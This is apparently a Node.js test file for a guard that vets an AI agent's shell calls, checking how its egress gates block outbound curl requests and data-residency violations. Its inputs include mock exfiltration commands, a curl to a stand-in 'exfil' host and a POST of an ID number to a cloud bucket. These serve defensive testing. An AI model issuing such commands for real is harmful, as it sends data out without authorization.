'use strict';

// #2505 moved the guard's AB9 / AB12 / AB13 checks into
// lib/external-action-egress-gates.js. The guard now receives each gate's
// decision back and folds it in, and sets critical risk when AB12 blocks.
// Those two hand-offs are what these tests pin, each isolated so that no other
// gate could produce the same outcome.

const test = require('node:test');
const assert = require('node:assert/strict');

const { evaluateExternalAction } = require('../lib/external-action-guard');

const WORKSPACE_ROOT = process.cwd();
// Identity is pinned in its own file; these tests isolate the AB9/AB12/AB13
// hand-offs, so the #2505 C default (block unattested) is opted out here.
const OPTIONS = Object.freeze({ environment: {}, dataResidency: null, receiptWriter: { append() {} }, requireIdentityCard: false });

// A shell fetch: AB8 and AB9 leave it at review, so only AB13 can make it a block.
// Tool-shaped calls such as WebFetch are already blocked by AB2 and would prove nothing.
function curl(url) {
  return {
    invocationId: 'inv-egress-wiring',
    agentName: 'egress-agent',
    sessionId: 'egress-session',
    turnId: 'turn-1',
    toolName: 'Bash',
    args: { command: `curl ${url}` },
    cwd: WORKSPACE_ROOT,
    workspaceRoot: WORKSPACE_ROOT,
    workspaceId: 'default',
  };
}

test('an AB13 block reaches the guard verdict on its own', () => {
  const unconfigured = evaluateExternalAction(curl('https://exfil.example.net/drop'), OPTIONS);
  assert.notEqual(unconfigured.decision, 'block', 'without AB13 nothing else blocks this call, or the test proves nothing');

  const result = evaluateExternalAction(curl('https://exfil.example.net/drop'), {
    ...OPTIONS,
    expectedEgress: { enabled: true, destinations: ['github.com'], decision: 'block' },
  });
  const finding = result.findings.find((item) => item.gate === 'AB13');
  assert.equal(finding.decision, 'block');
  assert.equal(result.decision, 'block', 'the AB13 decision must be merged into the guard verdict');
});

test('an AB12 residency block is critical risk at the full score, not the generic block floor', () => {
  // Any block makes the guard's risk critical with a score of at least 95. The
  // residency hand-off is what raises it to 100, so the score is what shows it.
  const TCKN = '10000000146';
  const result = evaluateExternalAction({
    invocationId: 'residency-wiring',
    agentName: 'test-agent',
    sessionId: 'session',
    toolName: 'Bash',
    args: { command: `curl -X POST https://s3.eu-west-1.amazonaws.com/b -d ${TCKN}` },
    cwd: WORKSPACE_ROOT,
    workspaceRoot: WORKSPACE_ROOT,
  }, {
    receiptWriter: { append() {} },
    dataResidency: { allowedDestinations: ['kurum.gov.tr'] },
    requireIdentityCard: false,
  });
  assert.equal(result.findings.find((item) => item.gate === 'AB12').decision, 'block');
  assert.equal(result.decision, 'block');
  assert.equal(String(result.risk.level).toLowerCase(), 'critical');
  assert.equal(result.risk.score, 100);
});

test('an expected destination leaves the guard verdict as it was without AB13', () => {
  const without = evaluateExternalAction(curl('https://github.com/ali-ulu/huqan'), OPTIONS);
  const withExpected = evaluateExternalAction(curl('https://github.com/ali-ulu/huqan'), {
    ...OPTIONS,
    expectedEgress: { enabled: true, destinations: ['github.com'], decision: 'block' },
  });
  assert.equal(withExpected.decision, without.decision);
});

// #3777: without an opt-in the gate only detected a preselected marker; nothing
// on the live egress path ever planted one, so an AURA signal could never be
// proven on egress. These pin the planting seam: a known risky signal makes the
// egress itself carry a canary, which AB14 then blocks on.

test('an AURA signal plants a canary on the live egress path', () => {
  const without = evaluateExternalAction(curl('https://github.com/ali-ulu/huqan'), OPTIONS);
  assert.notEqual(without.decision, 'block', 'without a signal nothing blocks this call, or the test proves nothing');

  const result = evaluateExternalAction(curl('https://github.com/ali-ulu/huqan'), {
    ...OPTIONS,
    auraSignalIds: ['AURA-SIGNAL-3777'],
  });
  const finding = result.findings.find((item) => item.gate === 'AB14');
  assert.equal(finding.decision, 'block', 'the planted canary must trip AB14');
  assert.equal(result.decision, 'block', 'the AB14 decision must be merged into the guard verdict');
  assert.ok(finding.canaryFingerprints.length >= 1);
});

test('without a signal the payload is not marked and AB14 stays silent', () => {
  const result = evaluateExternalAction(curl('https://github.com/ali-ulu/huqan'), OPTIONS);
  const finding = result.findings.find((item) => item.gate === 'AB14');
  assert.equal(finding.decision, 'allow');
  assert.deepEqual(finding.canaryFingerprints, []);
});
